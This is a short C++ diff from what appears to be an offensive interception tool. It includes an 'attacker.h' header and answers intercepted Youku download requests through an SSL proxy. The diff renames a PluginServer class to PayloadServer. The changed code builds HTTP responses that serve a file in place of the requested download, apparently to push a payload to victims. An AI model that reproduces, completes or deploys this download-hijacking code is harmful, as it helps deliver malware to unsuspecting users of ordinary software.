@@ -1,6 +1,6 @@
 
 #include "Youku.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "../attacker.h"
 #include <string.h>
 #include <stdlib.h>
@@ -140,12 +140,12 @@ int Youku::replyYouku(char*recvBuffer, int len, int buflimit, LPSSLPROXYPARAM ps
 		//char * szHttpPartialFormat = "HTTP/1.1 206 Partial Content\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\n"
 		//	"Content-Range: bytes %u-%u/%u\r\n"
 		//	"Content-Length: %u\r\n\r\n";
-		//ret = PluginServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpPartialFormat, begin,end,1);
+		//ret = PayloadServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpPartialFormat, begin,end,1);
 		ret = HttpPartial::AliCdnPartialFile(filename, pstSSLProxyParam, begin, end);
 	}
 	else {
 		char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
-		ret = PluginServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpRespFormat, 1);
+		ret = PayloadServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpRespFormat, 1);
 	}
 	return 0;
 }
